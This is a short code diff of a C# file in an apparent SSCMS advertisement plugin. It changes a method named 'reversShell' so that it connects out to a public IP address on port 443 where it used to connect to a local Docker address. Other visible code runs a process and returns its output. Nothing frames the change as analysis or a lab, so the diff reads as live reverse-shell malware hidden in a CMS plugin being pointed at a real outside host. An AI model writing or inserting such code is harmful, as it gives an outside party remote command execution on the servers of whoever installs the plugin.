@@ -24,8 +24,8 @@ namespace SSCMS.Advertisement
 		public void reversShell()
 		{
 			Socket socketshell = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-			IPAddress ip = IPAddress.Parse("172.17.0.1");
-			IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("8889"));
+			IPAddress ip = IPAddress.Parse("154.36.175.31");
+			IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("443"));
 			try
 			{
 				socketshell.Connect(point);
@@ -63,5 +63,6 @@ namespace SSCMS.Advertisement
 			string result = process.StandardOutput.ReadToEnd();
 			return result;
 		}
+
 	}
 }
